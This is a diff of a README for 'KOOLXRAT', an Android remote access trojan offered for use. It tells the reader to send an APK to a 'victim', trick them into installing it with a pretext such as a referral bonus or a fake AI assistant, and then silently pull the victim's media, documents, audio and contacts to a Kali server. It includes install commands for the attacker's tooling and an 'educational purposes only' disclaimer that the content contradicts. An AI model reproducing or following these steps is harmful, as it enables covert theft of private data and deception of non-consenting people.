@@ -1,18 +1,54 @@
-# Origianlly made by kool_efx ( exclusive only )
+# 🛠 KOOLXRAT (Exclusive by kool_efx)
 
-App -> Windows
+**Platform Flow:**
+- 📱 Victim Device → Android
+- 💻 Server & Data Receiver → Kali Linux
+- 🪟 Control Panel → Windows (Optional)
 
-Server Endpoint+ DATA -> Kali
+---
 
-victim -> Android
+## 🎯 Purpose
 
-Requirements: just send apk to victim and excuse him to install app just for any reason(u have to made your own reason) ( suggestion : ask him to install for refral)
+Once the victim installs the app and taps the **GlowAI** button:
+> 📤 All Media, Documents, Audios, and Contacts are silently transferred to your Kali server.
 
-PURPOSE:
-Once victim install the app and press glowAI button : ALL media/documents/Audios/Contacts will be transferred to Kali Server
+---
 
+## 📦 Installation Options
 
-{This project is officially mine from 0 to 100. i have not used anyone else's a file or even a single code.} 
+### 🔧 Manual Installation
+- Download the `.zip` file from this repository.
+- Extract and follow the setup steps inside each file manually.
+
+### ⚡ Auto Installation (Recommended)
+Use the auto script to install all required tools and servers in one command:
+
+```bash
+git clone https://github.com/koolefx/KOOLXRAT-data.git
+cd KOOLXRAT-data
+chmod +x install.sh
+./install.sh
+
+🧪 How to Use
+Send the APK to the target device (victim).
+
+Convince the victim to install it.
+
+💡 Suggestion: Ask them to install it for a referral bonus or a fake AI assistant.
+
+Once installed, the victim taps GlowAI, and data exfiltration begins in the background.
+
+🧾 Legal & Credits
+🔒 This project is for educational and cybersecurity testing purposes only.
+
+👨‍💻 Authored 100% by kool_efx — no external scripts, clones, or copied code were used.
+
+❗ Unauthorized use for malicious purposes is strictly discouraged.
+
+yaml
+Copy
+Edit
+
 
 # App Frontend
 ![image](https://github.com/user-attachments/assets/bba5f5ae-182d-4cd7-913f-8f2fba29a850)
